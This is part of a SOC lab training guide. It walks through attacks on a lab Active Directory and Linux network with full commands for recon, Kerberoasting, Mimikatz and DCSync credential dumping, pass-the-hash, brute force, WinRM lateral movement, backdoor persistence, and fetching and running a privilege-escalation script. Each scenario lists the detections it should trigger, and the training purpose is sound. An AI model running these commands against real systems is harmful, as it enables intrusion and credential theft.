# SOC LAB — ZERO TO HERO OPERATIONAL GUIDE
## Part 2: Attack Scenarios (Full Commands)

> **From Kali Linux (172.16.99.10) — VLAN 99**
> Run all attacks from Kali unless specified.

---

## SCENARIO 1 — RECONNAISSANCE & AD ENUMERATION
**MITRE:** T1046 (Network Scan), T1069.002 (BloodHound AD Recon)
**Goal:** Map the network and enumerate the Active Directory domain.

### 1A — Nmap Network Scan
```bash
# On Kali Linux (172.16.99.10)

# Fast discovery scan
nmap -sn 172.16.20.0/24
nmap -sn 172.16.30.0/24

# Full service scan on DC01
nmap -sV -sC -p- 172.16.20.10

# Scan Windows targets
nmap -sV -sC 172.16.20.30
nmap -sV -sC 172.16.20.31

# Scan Linux target (DMZ)
nmap -sV -sC 172.16.30.10

# OS fingerprinting
nmap -O 172.16.20.0/24

# Aggressive scan with scripts
nmap -A -T4 172.16.20.10
```

**Expected detections:**
- Suricata alert: `NMAP SYN Scan` (SID 1000001)
- Event ID 4662 on DC01 (LDAP enumeration)

### 1B — BloodHound AD Enumeration
```bash
# Start Neo4j (BloodHound backend)
sudo neo4j start
# Wait 30 seconds, then start BloodHound GUI
bloodhound &

# Collect AD data using bloodhound-python
bloodhound-python \
  -u alice.dupont \
  -p Password123 \
  -d lab.local \
  -ns 172.16.20.10 \
  --zip \
  -c All

# This creates a ZIP file (e.g., 20260506123456_BloodHound.zip)
# In BloodHound GUI: Upload Data → select the ZIP
```

**In BloodHound GUI — Key queries to run:**
```
1. Find All Domain Admins          → Shows bob.admin in Domain Admins
2. Shortest Paths to Domain Admins → Shows attack path
3. Find Kerberoastable Users       → Shows svc_sql account
4. Find Computers Where DA Can RDP → Target identification
```

**Expected detections:**
- Suricata: `LDAP Recon - BloodHound` (SID 1000005) — LDAP flood
- Event ID 4662 on DC01 (object access with LDAP)
- Event ID 4688 / Sysmon 1 on WIN-TARGET-1 (process creation)

### 1C — Manual LDAP Enumeration
```bash
# Enumerate domain users
ldapsearch -x -h 172.16.20.10 -D "alice.dupont@lab.local" \
  -w Password123 -b "dc=lab,dc=local" "(objectClass=user)" cn sAMAccountName

# Enumerate groups
ldapsearch -x -h 172.16.20.10 -D "alice.dupont@lab.local" \
  -w Password123 -b "dc=lab,dc=local" "(objectClass=group)" cn member

# CrackMapExec - AD info dump
crackmapexec smb 172.16.20.10 -u alice.dupont -p Password123 --users
crackmapexec smb 172.16.20.10 -u alice.dupont -p Password123 --groups
crackmapexec smb 172.16.20.10 -u alice.dupont -p Password123 --shares
```

---

## SCENARIO 2 — KERBEROASTING
**MITRE:** T1558.003
**Goal:** Extract Kerberos service tickets and crack them offline.

### 2A — Extract Service Tickets
```bash
# Using Impacket GetUserSPNs
GetUserSPNs.py lab.local/alice.dupont:Password123 \
  -dc-ip 172.16.20.10 \
  -request \
  -outputfile /tmp/kerberoast_hashes.txt

# View extracted tickets
cat /tmp/kerberoast_hashes.txt
# Expected output: $krb5tgs$23$*svc_sql$LAB.LOCAL$...
```

### 2B — Crack the Hash
```bash
# Using hashcat (RC4 = mode 13100)
hashcat -m 13100 \
  /tmp/kerberoast_hashes.txt \
  /usr/share/wordlists/rockyou.txt \
  --force

# Alternative with John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt \
  /tmp/kerberoast_hashes.txt

# Check results
hashcat -m 13100 /tmp/kerberoast_hashes.txt --show
# Expected: svc_sql password = Service123!
```

**Expected detections:**
- **Event ID 4769** on DC01 with TicketEncryptionType = `0x17` (RC4)
- Suricata: `Possible Kerberoasting - TGS RC4` (SID 1000003)
- Kibana alert: "Kerberoasting Activity"
- TheHive: Auto-case created by ElastAlert2

### 2C — Verify Detection in Kibana
```
1. Kibana → Discover
2. Index: logs-winlogbeat-*
3. KQL query:
   winlog.event_id: 4769 AND winlog.event_data.TicketEncryptionType: "0x17"
4. Look for: svc_sql as the ServiceName
5. Note: DC01 as the source host
```

---

## SCENARIO 3 — CREDENTIAL DUMP (MIMIKATZ / LSASS)
**MITRE:** T1003.001
**Goal:** Dump credentials from LSASS memory.

### 3A — Run Mimikatz from Kali via Evil-WinRM
```bash
# First get a shell on WIN-TARGET-2 (bob.admin has DA rights)
evil-winrm -i 172.16.20.31 -u bob.admin -p Admin@123

# Inside Evil-WinRM shell — download and run Mimikatz:
*Evil-WinRM* PS > upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe C:\Windows\Temp\m.exe
*Evil-WinRM* PS > C:\Windows\Temp\m.exe

# Inside Mimikatz:
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::wdigest
mimikatz # lsadump::dcsync /domain:lab.local /user:bob.admin
mimikatz # exit
```

### 3B — Extract NTLM Hash via Impacket (Remote)
```bash
# From Kali — DCSync attack (replicates DC credentials)
secretsdump.py lab.local/bob.admin:Admin@123@172.16.20.10

# Output will contain NTLM hashes for all domain users:
# alice.dupont:1001:aad3b435...:AAD3B435B51404EEAAD3B435B51404EE:::
# bob.admin:500:aad3b435...:31d6cfe0d16ae931b73c59d7e0c089c0:::
# svc_sql:1002:...
```

### 3C — SMB Relay Attack
```bash
# Set up Responder for NTLM capture
sudo responder -I eth0 -wrf

# In a second terminal — start ntlmrelayx
impacket-ntlmrelayx -tf /tmp/targets.txt -smb2support

# Create targets.txt with:
echo "172.16.20.30" > /tmp/targets.txt
echo "172.16.20.31" >> /tmp/targets.txt
```

**Expected detections:**
- **Sysmon Event ID 10** (Process Access to lsass.exe)
- **Event ID 4648** (explicit credential use)
- Kibana alert: "LSASS Memory Read via Process Access"
- Velociraptor auto-hunt triggered (if severity ≥ 7)

### 3D — Verify Detection in Kibana
```
KQL query:
  event.code: "10" AND winlog.event_data.TargetImage: "*lsass*"

Also check:
  process.name: "mimikatz.exe" OR process.command_line: "*sekurlsa*"
```

---

## SCENARIO 4 — PASS-THE-HASH (PTH)
**MITRE:** T1550.002
**Goal:** Authenticate using an NTLM hash without knowing the password.

### 4A — Extract Hash (from previous step or Mimikatz)
```bash
# If you already ran secretsdump.py, note bob.admin's NTLM hash
# Format: username:RID:LMhash:NThash:::
# Example: bob.admin:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# NTHash = 31d6cfe0d16ae931b73c59d7e0c089c0

export NTLM_HASH="31d6cfe0d16ae931b73c59d7e0c089c0"  # replace with real hash
```

### 4B — Pass-the-Hash via CrackMapExec
```bash
# Test PTH against WIN-TARGET-2 (bob.admin's machine)
crackmapexec smb 172.16.20.31 \
  -u bob.admin \
  -H $NTLM_HASH

# Expected: [+] lab.local\bob.admin:<hash> (Pwn3d!) if DA

# Spray across entire CORP subnet
crackmapexec smb 172.16.20.0/24 \
  -u bob.admin \
  -H $NTLM_HASH

# Enumerate shares with PTH
crackmapexec smb 172.16.20.31 \
  -u bob.admin \
  -H $NTLM_HASH \
  --shares

# Execute commands remotely via PTH
crackmapexec smb 172.16.20.31 \
  -u bob.admin \
  -H $NTLM_HASH \
  -x "whoami"
```

### 4C — Pass-the-Hash via Impacket psexec
```bash
# Get SYSTEM shell via PTH
psexec.py -hashes :$NTLM_HASH lab.local/bob.admin@172.16.20.31

# Or wmiexec for stealthier access
wmiexec.py -hashes :$NTLM_HASH lab.local/bob.admin@172.16.20.31
```

**Expected detections:**
- **Event ID 4624** with Logon Type 3 (Network logon) — no password, hash used
- **Event ID 4672** (Special privileges assigned) — DA account
- Sysmon Event 3 — outbound SMB connection from Kali to WIN-02
- Suricata: `Possible Pass-the-Hash SMB` (SID 1000004)

### 4D — Verify Detection in Kibana
```
KQL query for PTH detection:
  event.code: "4624" AND winlog.event_data.LogonType: "3" AND winlog.event_data.LogonProcessName: "NtLmSsp"

Also check for failed attempts:
  event.code: "4625" AND winlog.event_data.LogonType: "3"
```

---

## SCENARIO 5 — BRUTE FORCE ATTACK (SSH + SMB)
**MITRE:** T1110
**Goal:** Test credential resilience via brute force.

### 5A — SSH Brute Force on Linux Target
```bash
# Hydra SSH brute force
hydra -l labuser \
  -P /usr/share/wordlists/rockyou.txt \
  ssh://172.16.30.10 \
  -t 4 \
  -V \
  -o /tmp/ssh_results.txt

# Faster with specific password list
hydra -l labuser \
  -P /usr/share/wordlists/fasttrack.txt \
  ssh://172.16.30.10

# Try common passwords
hydra -l root \
  -P /usr/share/wordlists/rockyou.txt \
  ssh://172.16.30.10

# Also target labuser (password: password123 — set during lab setup)
# Hydra should find: labuser:password123
```

### 5B — SMB Brute Force on Windows
```bash
# Brute force Administrator on WIN-TARGET-1
hydra -l Administrator \
  -P /usr/share/wordlists/rockyou.txt \
  smb://172.16.20.30

# CrackMapExec brute force
crackmapexec smb 172.16.20.30 \
  -u Administrator \
  -p /usr/share/wordlists/fasttrack.txt

# Spray common passwords across subnet
crackmapexec smb 172.16.20.0/24 \
  -u alice.dupont \
  -p Password123,Admin@123,password,P@ssw0rd

# RDP brute force
hydra -l alice.dupont \
  -P /usr/share/wordlists/rockyou.txt \
  rdp://172.16.20.30
```

### 5C — FTP Brute Force on Linux Target
```bash
# FTP is enabled with anonymous access
ftp 172.16.30.10
# Username: anonymous / Password: (blank)

# Brute force FTP users
hydra -l labuser \
  -P /usr/share/wordlists/fasttrack.txt \
  ftp://172.16.30.10
```

**Expected detections:**
- **Event ID 4625** (failed logon) — multiple rapid failures
- Suricata: `SSH Brute Force Attempt` (SID 1000002) — >10 attempts in 30s
- Kibana alert: "Multiple Failed Logon Attempts"
- Linux auditd logs in Kibana: `PAM authentication failure`

### 5D — Verify Detection in Kibana
```
Windows brute force:
  event.code: "4625"
  | stats count by source.ip, user.name
  | where count > 10

Linux SSH failures:
  event.dataset: "system.auth" AND system.auth.ssh.event: "Failed"
  | stats count by source.ip

Suricata SSH alert:
  tags: "suricata" AND alert.signature: "*Brute Force*"
```

---

## SCENARIO 6 — LATERAL MOVEMENT (Evil-WinRM)
**MITRE:** T1021.006 (WinRM), T1021.002 (SMB)
**Goal:** Move from initial access to privileged host.

### 6A — WinRM Lateral Movement
```bash
# Connect to WIN-TARGET-2 (bob.admin = Domain Admin)
evil-winrm -i 172.16.20.31 \
  -u bob.admin \
  -p Admin@123

# Inside WinRM shell:
*Evil-WinRM* PS > whoami
*Evil-WinRM* PS > hostname
*Evil-WinRM* PS > net user bob.admin /domain
*Evil-WinRM* PS > net group "Domain Admins" /domain

# Check local admins
*Evil-WinRM* PS > net localgroup administrators

# Network connections
*Evil-WinRM* PS > netstat -ano

# Running processes
*Evil-WinRM* PS > Get-Process

# Scheduled tasks (persistence check)
*Evil-WinRM* PS > schtasks /query /fo LIST /v | findstr "Task Name"

# Recent files
*Evil-WinRM* PS > Get-ChildItem C:\Users -Recurse | Sort LastWriteTime | Select -Last 20
```

### 6B — SMB Lateral Movement with PsExec
```bash
# From Kali via Impacket
psexec.py lab.local/bob.admin:Admin@123@172.16.20.30

# Or with smbclient share enumeration first
smbclient -L //172.16.20.30 -U bob.admin%Admin@123
smbclient //172.16.20.30/C$ -U bob.admin%Admin@123

# Copy and execute payload
smbclient //172.16.20.31/C$ -U bob.admin%Admin@123 \
  -c "put /tmp/test.exe Windows\\Temp\\test.exe"
```

### 6C — Persistence via Registry
```powershell
# Inside Evil-WinRM shell — add registry persistence
*Evil-WinRM* PS > reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" `
  /v "Updater" /t REG_SZ /d "C:\Windows\Temp\backdoor.exe" /f

# Scheduled task persistence
*Evil-WinRM* PS > schtasks /create /tn "WindowsUpdate" `
  /tr "C:\Windows\Temp\backdoor.exe" /sc ONLOGON /ru SYSTEM /f
```

**Expected detections:**
- **Event ID 4624** (successful logon) + Logon Type 3
- **Sysmon Event 3** (network connection to port 5985/WinRM)
- **Sysmon Event 22** (DNS query for WIN-02)
- **Event ID 4698** (scheduled task created)
- **Sysmon Event 13** (registry value set — Run key)

---

## SCENARIO 7 — LINUX TARGET EXPLOITATION
**MITRE:** T1190, T1021.004 (SSH)
**Goal:** Exploit the exposed Linux DMZ target.

### 7A — Service Enumeration
```bash
nmap -sV -sC -p 21,22,80 172.16.30.10

# Test anonymous FTP
ftp 172.16.30.10
# Login: anonymous
ls -la

# Test Apache web server
curl http://172.16.30.10
curl -I http://172.16.30.10
```

### 7B — SSH Login with Weak Credentials
```bash
# labuser:password123 (set during lab setup)
ssh labuser@172.16.30.10

# Once in:
whoami
id
sudo -l                       # Check sudo privileges
cat /etc/passwd               # List users
cat /etc/cron.d/*             # Check cron jobs
ps aux                        # Running processes
netstat -tupln               # Network listeners
find / -perm -4000 2>/dev/null   # SUID binaries
```

### 7C — Privilege Escalation on Linux
```bash
# Check sudo misconfigurations
sudo -l

# Common privilege escalation via find SUID
find / -perm -u=s -type f 2>/dev/null

# Check for writable cron jobs
ls -la /etc/cron*

# LinPEAS for automated PE check
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh 2>/dev/null | tee /tmp/pe_results.txt
```

**Expected detections:**
- Linux auditd logs → Kibana: `SSH_AUTH_FAILURE` then `SSH_AUTH_SUCCESS`
- Suricata: SSH anomaly detection
- Elastic Agent logs: command execution events

---

*Continue in Part 3: Investigation, Forensics, TheHive Case Management*
